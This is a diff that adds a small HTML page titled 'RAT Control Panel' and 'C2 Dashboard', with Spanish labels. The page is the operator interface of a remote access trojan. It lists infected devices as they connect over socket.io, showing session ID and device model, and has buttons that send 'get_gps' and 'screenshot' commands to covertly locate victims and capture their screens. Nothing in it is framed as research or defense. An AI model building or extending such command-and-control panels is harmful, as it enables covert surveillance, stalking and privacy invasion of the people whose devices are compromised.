@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>RAT Control Panel</title>
+    <script src="/socket.io/socket.io.js"></script>
+    <style>
+        body { background: #1a1a1a; color: #00ff00; font-family: monospace; padding: 20px; }
+        .agent-card { border: 1px solid #333; padding: 10px; margin: 10px 0; background: #222; }
+        button { background: #00ff00; color: black; border: none; padding: 5px 10px; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <h1>C2 Dashboard</h1>
+    <div id="agents"></div>
+
+    <script>
+        const socket = io();
+        socket.on('new-agent', (data) => {
+            const div = document.createElement('div');
+            div.className = 'agent-card';
+            div.innerHTML = `
+                <strong>ID:</strong> ${data.sessionId} <br>
+                <strong>Modelo:</strong> ${data.deviceInfo.model} <br>
+                <button onclick="sendCmd('${data.sessionId}', 'get_gps')">Localizar GPS</button>
+                <button onclick="sendCmd('${data.sessionId}', 'screenshot')">Capturar Pantalla</button>
+            `;
+            document.getElementById('agents').appendChild(div);
+        });
+
+        function sendCmd(sessionId, command) {
+            fetch(`/api/command/${sessionId}`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ command })
+            });
+        }
+    </script>
+</body>
+</html>
